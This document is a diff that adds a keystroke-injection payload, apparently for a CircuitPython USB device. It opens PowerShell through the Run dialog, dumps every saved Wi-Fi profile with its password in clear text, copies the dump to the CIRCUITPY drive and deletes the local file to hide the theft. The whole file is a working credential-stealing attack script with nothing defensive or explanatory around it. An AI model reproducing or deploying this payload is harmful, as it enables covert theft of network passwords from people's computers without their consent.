@@ -1,0 +1,29 @@
+DELAY 400
+GUI m
+DELAY 200
+GUI r
+DELAY 100
+STRING powershell.exe
+ENTER
+DELAY 900
+REM ---------------
+REM Create wifi dump file
+REM ---------------
+STRING $profiles = ((netsh wlan show profiles) -match '\s{2,}:\s') -replace '.*:\s' , ''; foreach($profile in $profiles){netsh wlan show profile $profile key=clear >> wifi_dump.txt}
+ENTER
+DELAY 3000
+REM ---------------
+REM Copy wifi dump file to CIRCUITPY
+REM ---------------
+STRING $DriveLetter = (Get-PSDrive | Where-Object { $_.Root -like '*CIRCUITPY*' }).Name; if($DriveLetter) {Copy-Item 'wifi_dump.txt' -Destination "$DriveLetter:\wifi_dump.txt"} else {Write-Output 'CIRCUITPY not found';}
+ENTER
+DELAY 1000
+REM ---------------
+REM Delete wifi dump file locally
+REM ---------------
+STRING Remove-Item 'wifi_dump.txt'
+DELAY 100
+ENTER
+STRING exit
+DELAY 100
+ENTER
